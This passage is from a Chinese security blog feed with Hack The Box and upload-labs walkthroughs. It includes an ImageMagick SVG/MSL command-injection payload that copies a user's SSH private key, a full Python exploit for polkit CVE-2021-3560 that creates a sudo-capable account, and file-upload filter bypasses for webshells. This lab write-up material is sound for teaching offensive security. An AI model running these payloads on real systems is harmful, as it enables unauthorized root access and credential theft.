<p><img src="https://img-blog.csdnimg.cn/4c3e86599bf44cfc96a8a44f7ec80ac1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们修改一下poc.svg里面的内容，尝试将<code>thomas</code>账户的密钥文件读取出来</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">authenticate</span>=<span class="string">&#x27;ff&quot; `echo $(cat ~/.ssh/id_rsa)&gt; /dev/shm/id_rsa`;&quot;&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;pdf:/etc/passwd&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">get</span> <span class="attr">width</span>=<span class="string">&quot;base-width&quot;</span> <span class="attr">height</span>=<span class="string">&quot;base-height&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resize</span> <span class="attr">geometry</span>=<span class="string">&quot;400x400&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;test.png&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;700&quot;</span> <span class="attr">height</span>=<span class="string">&quot;700&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span>       </span><br><span class="line">  <span class="tag">&lt;<span class="name">image</span> <span class="attr">xlink:href</span>=<span class="string">&quot;msl:poc.svg&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>成功读取密钥信息，我们可以开启一个http服务将id_rsa文件下载下来<br><img src="https://img-blog.csdnimg.cn/1e6d846d9e1f4541bfd05772e96373d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>重新编排一下顺序后，可以成功连接到thomas用户<br><img src="https://img-blog.csdnimg.cn/d92c5bb5b20846719f1eb0a4e5c57592.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权到ROOT"><a href="#提权到ROOT" class="headerlink" title="提权到ROOT"></a>提权到ROOT</h2><p>我们输入<code>sudo -l</code>命令，发现一个<code>neofetch</code>程序可以以root身份运行<br><img src="https://img-blog.csdnimg.cn/5e89769e71c5441f821d397997cab9ee.png" alt="在这里插入图片描述"><br>我们尝试运行这个程序，输出是linux内核的基本信息<br><img src="https://img-blog.csdnimg.cn/4e51200b476d4973853ae1f498c63e2b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>既然这个程序可以利用，那么我们可以进入这个程序的配置文件中，更改其配置文件信息达到我们提权的目的。我们更改<code>/home/thomas/.config/neofetch</code>这个目录下的config.conf文件<br><img src="https://img-blog.csdnimg.cn/7383f86d421b435a81e6f2e51b8a4e7b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>因为我们使用neofetch程序提权的时候，会保留XDG_CONFIG_HOME的环境变量，所以我们要将thomas.config导出到基本配置环境路径<br><img src="https://img-blog.csdnimg.cn/a0cb500158324ae88c35eb1c1f8d319f.png" alt="在这里插入图片描述"><br>得到root权限<br><img src="https://img-blog.csdnimg.cn/f40946dc24a94472b51143eaebc4fbff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，这个靶机还是相当有难度的。我后面提权部分基本也是照着别人的建议来做，真的实在是太难了。提权和漏洞利用的方法都是在红队攻防实战中非常常见的，能掌握对技术提升方面很有帮助。</p>
]]></content>
      <categories>
        <category>文件上传漏洞</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Paper</title>
    <url>/2022/02/25/Paper/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>可以看到目标端口只开放了ssh和web服务<br><img src="https://img-blog.csdnimg.cn/8a3867d4a1e345a5a11c281ff39e1f29.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>当我们访问web服务时，发现只是一个普通的apache搭建的页面。进行目录扫描时，发现一个<code>manual</code>页面，但是里面只有一些没价值的信息</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/07f9450ea45947e0af77ec195c369cf1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/74d839c7fc824a2a8af4b2c081cd01cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>但是在回应包中，我们看到了一个<code>office.paper</code>这样的域名，我们添加到hosts文件后尝试去访问一下<br><img src="https://img-blog.csdnimg.cn/b73a8b76a26d4ae289b29b6085ed2c11.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>打开页面后，我们发现是wordpress搭建的页面。我们果断使用wpscan工具扫描一下是否存在漏洞<br><img src="https://img-blog.csdnimg.cn/178c760fdb3e46848aa9a75498698290.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现wordpress的版本是<code>5.2.3</code><br><img src="https://img-blog.csdnimg.cn/43583dd7ee5c46fa987f01ac6c04519b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在EDB上找到一个未经身份验证查看他人私人帖子的漏洞，去尝试一下是否能够成功利用。但是发现只出现404页面<br><img src="https://img-blog.csdnimg.cn/5edd974c3ea34e8c953c7d8c06a35033.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>尝试去掉order参数，成功显示出帖子的详细内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">Micheal please remove the secret from drafts for gods sake!</span><br><span class="line"></span><br><span class="line">Hello employees of Blunder Tiffin,</span><br><span class="line"></span><br><span class="line">Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.</span><br><span class="line"></span><br><span class="line">So, I kindly request you all to take your discussions from the public blog to a more private chat system.</span><br><span class="line"></span><br><span class="line">-Nick</span><br><span class="line"></span><br><span class="line"># Warning for Michael</span><br><span class="line"></span><br><span class="line">Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick</span><br><span class="line"></span><br><span class="line">Threat Level Midnight</span><br><span class="line"></span><br><span class="line">A MOTION PICTURE SCREENPLAY,</span><br><span class="line">WRITTEN AND DIRECTED BY</span><br><span class="line">MICHAEL SCOTT</span><br><span class="line"></span><br><span class="line">[INT:DAY]</span><br><span class="line"></span><br><span class="line">Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….</span><br><span class="line"></span><br><span class="line"># Secret Registration URL of new Employee chat system</span><br><span class="line"></span><br><span class="line">http://chat.office.paper/register/8qozr226AhkCHZdyY</span><br><span class="line"></span><br><span class="line"># I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.</span><br><span class="line"></span><br><span class="line"># Also, stop looking at my drafts. Jeez!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>从上面的内容中，我们可以得到了一个新的聊天系统网址<code>http://chat.office.paper/register/8qozr226AhkCHZdyY</code>。尝试访问发现是一个注册页面<br><img src="https://img-blog.csdnimg.cn/2c563f2f9ee4472180285e1333b6c03e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>注册成功后我们进入了一个聊天窗口，<br><img src="https://img-blog.csdnimg.cn/ae192b2228ce4f5a8fea1614b00fe234.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在这里有人说到，只要添加了一个<code>recyclops</code>这个新的机器人，机器人就会告诉你你想要问题的答案</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> kellylikescupcakes Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.</span><br><span class="line">Most frequently asked questions include:</span><br><span class="line">- What time is it?</span><br><span class="line">- What new files are in your sales directory?</span><br><span class="line">- Why did the salesman crossed the road?</span><br><span class="line">- What&#x27;s the content of file x in your sales directory? etc.</span><br><span class="line">Please note that I am a beta version and I still have some bugs to be fixed.</span><br><span class="line">How to use me ? :</span><br><span class="line">1. Small Talk:</span><br><span class="line">You can ask me how dwight&#x27;s weekend was, or did he watched the game last night etc.</span><br><span class="line">eg: &#x27;recyclops how was your weekend?&#x27; or &#x27;recyclops did you watched the game last night?&#x27; or &#x27;recyclops what kind of bear is the best?</span><br><span class="line">2. Joke:</span><br><span class="line">You can ask me Why the salesman crossed the road.</span><br><span class="line">eg: &#x27;recyclops why did the salesman crossed the road?&#x27;</span><br><span class="line">&lt;=====The following two features are for those boneheads, who still don&#x27;t know how to use scp. I&#x27;m Looking at you Kevin.=====&gt;</span><br><span class="line">For security reasons, the access is limited to the Sales folder.</span><br><span class="line">3. Files:</span><br><span class="line">eg: &#x27;recyclops get me the file test.txt&#x27;, or &#x27;recyclops could you send me the file src/test.php&#x27; or just &#x27;recyclops file test.txt&#x27;</span><br><span class="line">4. List:</span><br><span class="line">You can ask me to list the files</span><br><span class="line">5. Time:</span><br><span class="line">You can ask me to what the time is</span><br><span class="line">eg: &#x27;recyclops what time is it?&#x27; or just &#x27;recyclops time&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>目前我们知道的信息是，我们有一个可互动的recyclops机器人，机器人可以帮我们获取文件内容，并且我们不能在频道内发言。我们尝试让它读取test.txt文件时，它说这个文件并不存在，但是却暴露出了当前所在的路径，那么我们可以尝试测试是否存在路径穿越的漏洞<br><img src="https://img-blog.csdnimg.cn/f56f488f29004c4ba948a413f0c78b38.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>经过我们的反复测试，我们发现了确实存在路径穿越漏洞<br><img src="https://img-blog.csdnimg.cn/5d4e7e5841fc4e34aa1a81f1c83dbf6c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们查看一下当前目录上都存在哪些文件，很可惜没什么有价值的文件信息<br><img src="https://img-blog.csdnimg.cn/29f5abe791764b659abbc217771aa19a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们再查看上一级目录的文件信息<br><img src="https://img-blog.csdnimg.cn/709be64a7a4840d6ac7b8856966c9fe3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现存在一个user.txt文件，尝试读取其内容却告诉我们权限不够<br><img src="https://img-blog.csdnimg.cn/8e0ca8de1430401d98f7d27fccac0641.png" alt="在这里插入图片描述"><br>但是我们发现了一个十分有趣的目录<code>hubot</code>，发现目录里存在一个配置文件<code>.env</code>，在里面找到一个密码<code>Queenofblad3s!23</code><br><img src="https://img-blog.csdnimg.cn/8811056432c040ffa50cd28396878e3a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们尝试使用ssh连接是否能成功，账户使用<code>dwight</code><br><img src="https://img-blog.csdnimg.cn/5edd446e145244249b04910ded3c123c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权ROOT"><a href="#提权ROOT" class="headerlink" title="提权ROOT"></a>提权ROOT</h2><p>这里提权挺迷的，但是还是有迹可循。我们查看进程时，发现存在一个<code>polkit</code>进程，这个应用是存在漏洞编号的，对应的漏洞编号为<code>CVE-2021-3560</code><br><img src="https://img-blog.csdnimg.cn/957af5667a09416987dac45eaa386a79.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;**************&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;Exploit: Privilege escalation with polkit - CVE-2021-3560&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;Exploit code written by Ahmad Almorabea @almorabea&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;Original exploit author: Kevin Backhouse &quot;</span>)</span><br><span class="line">print(<span class="string">&quot;For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;**************&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;[+] Starting the Exploit &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">check = <span class="literal">True</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> check:</span><br><span class="line">	counter = counter +<span class="number">1</span></span><br><span class="line">	process = subprocess.Popen([<span class="string">&#x27;dbus-send&#x27;</span>,<span class="string">&#x27;--system&#x27;</span>,<span class="string">&#x27;--dest=org.freedesktop.Accounts&#x27;</span>,<span class="string">&#x27;--type=method_call&#x27;</span>,<span class="string">&#x27;--print-reply&#x27;</span>,<span class="string">&#x27;/org/freedesktop/Accounts&#x27;</span>,<span class="string">&#x27;org.freedesktop.Accounts.CreateUser&#x27;</span>,<span class="string">&#x27;string:ahmed&#x27;</span>,<span class="string">&#x27;string:&quot;Ahmad Almorabea&#x27;</span>,<span class="string">&#x27;int32:1&#x27;</span>])</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">    		<span class="comment">#print(&#x27;1 - Running in process&#x27;, process.pid)</span></span><br><span class="line">		Random = random.uniform(<span class="number">0.006</span>,<span class="number">0.009</span>)</span><br><span class="line">		process.wait(timeout=Random)</span><br><span class="line">		process.kill()</span><br><span class="line">	<span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">    		<span class="comment">#print(&#x27;Timed out - killing&#x27;, process.pid)</span></span><br><span class="line">    		process.kill()</span><br><span class="line"></span><br><span class="line">	user = subprocess.run([<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;ahmed&#x27;</span>], stdout=subprocess.PIPE).stdout.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> user.find(<span class="string">&quot;uid&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">		print(<span class="string">&quot;[+] User Created with the name of ahmed&quot;</span>)</span><br><span class="line">		print(<span class="string">&quot;[+] Timed out at: &quot;</span>+<span class="built_in">str</span>(Random))</span><br><span class="line">		check =<span class="literal">False</span></span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> counter &gt; <span class="number">2000</span>:</span><br><span class="line">		print(<span class="string">&quot;[-] Couldn&#x27;t add the user, try again it may work&quot;</span>)</span><br><span class="line">		sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">	<span class="comment">#print(i)</span></span><br><span class="line">	uid = <span class="string">&quot;/org/freedesktop/Accounts/User&quot;</span>+<span class="built_in">str</span>(pwd.getpwnam(<span class="string">&#x27;ahmed&#x27;</span>).pw_uid)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#In case you need to put a password un-comment the code below and put your password after string:yourpassword&#x27;</span></span><br><span class="line">	password = <span class="string">&quot;string:&quot;</span></span><br><span class="line">	<span class="comment">#res = subprocess.run([&#x27;openssl&#x27;, &#x27;passwd&#x27;,&#x27;-5&#x27;,password], stdout=subprocess.PIPE).stdout.decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">	<span class="comment">#password = f&quot;string:&#123;res.rstrip()&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">	process = subprocess.Popen([<span class="string">&#x27;dbus-send&#x27;</span>,<span class="string">&#x27;--system&#x27;</span>,<span class="string">&#x27;--dest=org.freedesktop.Accounts&#x27;</span>,<span class="string">&#x27;--type=method_call&#x27;</span>,<span class="string">&#x27;--print-reply&#x27;</span>,uid,<span class="string">&#x27;org.freedesktop.Accounts.User.SetPassword&#x27;</span>,password,<span class="string">&#x27;string:GoldenEye&#x27;</span>])</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">    		<span class="comment">#print(&#x27;1 - Running in process&#x27;, process.pid)</span></span><br><span class="line">    		Random = random.uniform(<span class="number">0.006</span>,<span class="number">0.009</span>)</span><br><span class="line">    		process.wait(timeout=Random)</span><br><span class="line">    		process.kill()</span><br><span class="line">	<span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">    		<span class="comment">#print(&#x27;Timed out - killing&#x27;, process.pid)</span></span><br><span class="line">    		process.kill()</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Timed out at: &quot;</span> + <span class="built_in">str</span>(Random))</span><br><span class="line">print(<span class="string">&quot;[+] Exploit Completed, Your new user is &#x27;Ahmed&#x27; just log into it like, &#x27;su ahmed&#x27;, and then &#x27;sudo su&#x27; to root &quot;</span>)</span><br><span class="line"></span><br><span class="line">p = subprocess.call(<span class="string">&quot;(su ahmed -c &#x27;sudo su&#x27;)&quot;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>我们将脚本上传到目标主机上运行<br><img src="https://img-blog.csdnimg.cn/81867cb04d4a4523b628cfbe041c54e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>路径穿越漏洞</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Upload-labs</title>
    <url>/2022/02/24/Upload-labs/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之所以写这篇文章，主要还是在现实的渗透测试中，我们还是很大几率能遇见文件上传漏洞的。遗憾的是很多时候我们即使遇到了上传点，但是因为一般的上传点多多少少都做了黑白名单的过滤，所以不是那么容易拿下shell的。因此这个靶场就是对文件上传漏洞的具体剖析。</p>
<h2 id="PASS-01"><a href="#PASS-01" class="headerlink" title="PASS-01"></a>PASS-01</h2><p>首先我们必须进行目录扫描去发现上传的目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.101.208/upload-labs/&quot;</span> -x404,500,503 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/3cd138741a4949c9a1c3017e98ba4ee1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/9c65ec8dd1374d7e85c6094598a6a15e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>从源码中可判断只在前端进行过滤，那么可以直接通过抓包就能进行绕过</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一关当我们上传php文件时，前端出现拦截显示我们只能上传以下三种文件格式。初步判断只是前端拦截，可以通过抓包更改文件格式进行绕过<br><img src="https://img-blog.csdnimg.cn/cfcaf1a1cf9c474499f10f3e7f0f65e7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们把shell.php文件重命名为shell.jpg文件，然后抓包上传修改，最后使用冰蝎可以上线成功<br><img src="https://img-blog.csdnimg.cn/b1155c9002f0439dbccbca36557aae68.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-02"><a href="#PASS-02" class="headerlink" title="PASS-02"></a>PASS-02</h2><p>从源码中可以判断是通过MIME类型进行过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们尝试上传php文件的时候，它一样也做了过滤<br><img src="https://img-blog.csdnimg.cn/c4960976e2e440ca83595a85f7fbcab9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>所以我们再次进行抓包分析，抓包时我们将<code>Content-Type</code>类型的值改为image/jpeg<br><img src="https://img-blog.csdnimg.cn/1f8a0582607c4e499035ae22595c1be7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>最后能成功上线主机<br><img src="https://img-blog.csdnimg.cn/055145b412104604bf55d786d1786cac.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-03"><a href="#PASS-03" class="headerlink" title="PASS-03"></a>PASS-03</h2><p>从源码中可以看到，开发者只禁止了常见的四个文件后缀名，但是我们可以尝试上传一些不常见的文件后缀名，例如php5，phtml等等。</p>
